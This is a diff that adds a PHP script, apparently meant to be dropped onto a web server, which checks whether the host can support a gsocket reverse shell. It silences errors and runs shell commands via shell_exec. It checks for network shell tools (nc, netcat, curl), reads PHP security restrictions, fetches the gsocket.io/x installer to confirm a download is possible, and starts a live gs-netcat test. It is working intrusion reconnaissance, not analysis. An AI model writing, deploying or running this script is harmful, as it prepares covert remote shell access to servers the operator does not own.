@@ -1,0 +1,157 @@
+<?php
+// gsocket Compatibility Checker
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+error_reporting(0);
+
+function check($cmd) {
+    $output = "";
+    $cmd .= " 2>&1";
+    if (function_exists('shell_exec')) return @shell_exec($cmd);
+    if (function_exists('system')) { @system($cmd); return ""; }
+    return "";
+}
+
+echo "<h3>🔍 gsocket Reverse Shell Compatibility Check</h3>";
+
+// Check 1: Basic system utilities
+echo "<h4>📋 System Requirements:</h4>";
+$checks = [
+    'bash' => 'which bash',
+    'sh' => 'which sh',
+    'curl' => 'which curl',
+    'wget' => 'which wget',
+    'perl' => 'which perl',
+    'python3' => 'which python3',
+    'python' => 'which python',
+    'nc' => 'which nc',
+    'netcat' => 'which netcat'
+];
+
+foreach ($checks as $tool => $cmd) {
+    $result = check($cmd);
+    $status = !empty($result) ? "✅" : "❌";
+    echo "$status $tool: " . (!empty($result) ? trim($result) : "Not found") . "<br>";
+}
+
+// Check 2: Execution methods
+echo "<h4>🚀 Execution Methods:</h4>";
+$exec_methods = [
+    'shell_exec' => function_exists('shell_exec'),
+    'system' => function_exists('system'),
+    'exec' => function_exists('exec'),
+    'passthru' => function_exists('passthru'),
+    'proc_open' => function_exists('proc_open'),
+    'popen' => function_exists('popen')
+];
+
+foreach ($exec_methods as $method => $available) {
+    $status = $available ? "✅" : "❌";
+    echo "$status $method<br>";
+}
+
+// Check 3: Network connectivity
+echo "<h4>🌐 Network Checks:</h4>";
+$network_checks = [
+    'Internet Access' => 'curl -fsSL --connect-timeout 5 https://gsocket.io/ >/dev/null && echo "Yes" || echo "No"',
+    'DNS Resolution' => 'nslookup gsocket.io 2>/dev/null | grep -q "Address" && echo "Yes" || echo "No"',
+    'Outbound HTTPS' => 'timeout 3 curl -k https://google.com >/dev/null 2>&1 && echo "Yes" || echo "No"'
+];
+
+foreach ($network_checks as $desc => $cmd) {
+    $result = check($cmd);
+    $status = strpos($result, 'Yes') !== false ? "✅" : "❌";
+    echo "$status $desc: " . trim($result) . "<br>";
+}
+
+// Check 4: gsocket specific
+echo "<h4>🔧 gsocket Specific:</h4>";
+$gsocket_checks = [
+    'gsocket installed' => 'which gsocket || which gs-netcat',
+    'gsocket version' => 'gsocket --version 2>/dev/null || gs-netcat --version 2>/dev/null || echo "Not installed"',
+    'Can download gsocket' => 'curl -fsSLk https://gsocket.io/x 2>/dev/null | head -c 100 | grep -q "bash" && echo "Yes" || echo "No"'
+];
+
+foreach ($gsocket_checks as $desc => $cmd) {
+    $result = check($cmd);
+    $status = !empty($result) && strpos($result, 'Not installed') === false && strpos($result, 'No') === false ? "✅" : "❌";
+    echo "$status $desc: " . trim($result) . "<br>";
+}
+
+// Check 5: Security restrictions
+echo "<h4>🛡️ Security Restrictions:</h4>";
+$security_checks = [
+    'disabled_functions' => @ini_get('disable_functions'),
+    'open_basedir' => @ini_get('open_basedir'),
+    'safe_mode' => @ini_get('safe_mode'),
+    'proc_open allowed' => 'echo "test" | timeout 1 bash -c "cat" 2>/dev/null && echo "Yes" || echo "No"'
+];
+
+echo "disable_functions: " . ($security_checks['disabled_functions'] ?: 'None') . "<br>";
+echo "open_basedir: " . ($security_checks['open_basedir'] ?: 'None') . "<br>";
+echo "safe_mode: " . ($security_checks['safe_mode'] ?: 'Off') . "<br>";
+echo "proc_open test: " . trim(check($security_checks['proc_open allowed'])) . "<br>";
+
+// Final assessment
+echo "<h4>🎯 Compatibility Score:</h4>";
+$score = 0;
+$total = 0;
+
+// Calculate score
+foreach ($exec_methods as $method => $available) {
+    if ($available) $score++;
+    $total++;
+}
+
+$has_network = !empty(check('curl -fsSL https://google.com >/dev/null 2>&1 && echo "yes"'));
+if ($has_network) $score += 2;
+$total += 2;
+
+$has_shell = !empty(check('which bash')) || !empty(check('which sh'));
+if ($has_shell) $score++;
+$total++;
+
+$percentage = ($score / $total) * 100;
+
+if ($percentage >= 80) {
+    echo "✅ <span style='color: green; font-weight: bold;'>EXCELLENT - gsocket should work perfectly!</span><br>";
+} elseif ($percentage >= 60) {
+    echo "⚠️ <span style='color: orange; font-weight: bold;'>GOOD - gsocket will likely work</span><br>";
+} elseif ($percentage >= 40) {
+    echo "⚠️ <span style='color: orange; font-weight: bold;'>FAIR - gsocket might work with fallbacks</span><br>";
+} else {
+    echo "❌ <span style='color: red; font-weight: bold;'>POOR - gsocket probably won't work</span><br>";
+}
+
+echo "Score: $score/$total ($percentage%)<br>";
+
+// Test actual gsocket connection
+echo "<h4>🧪 Live Test:</h4>";
+$test_secret = "tootsie0032" . bin2hex(random_bytes(4));
+$test_cmd = "timeout 3 gs-netcat -s '$test_secret' -l -i 2>&1 & sleep 1; timeout 2 gs-netcat -s '$test_secret' -i 2>&1";
+
+$test_result = check($test_cmd);
+if (strpos($test_result, 'connected') !== false || strpos($test_result, 'GS') !== false) {
+    echo "✅ <span style='color: green;'>gsocket test successful!</span><br>";
+} else {
+    echo "❌ <span style='color: red;'>gsocket test failed</span><br>";
+}
+
+echo "<pre>Test output: " . htmlspecialchars($test_result) . "</pre>";
+
+// Recommendations
+echo "<h4>💡 Recommendations:</h4>";
+if (!empty(check('which gsocket')) || !empty(check('which gs-netcat'))) {
+    echo "✅ gsocket is already installed - ready to use!<br>";
+} elseif ($has_network) {
+    echo "✅ Can download gsocket - will auto-install<br>";
+} else {
+    echo "❌ No network access - need pre-installed gsocket<br>";
+}
+
+if (count(array_filter($exec_methods)) >= 3) {
+    echo "✅ Multiple execution methods available<br>";
+} else {
+    echo "❌ Limited execution methods<br>";
+}
+?>
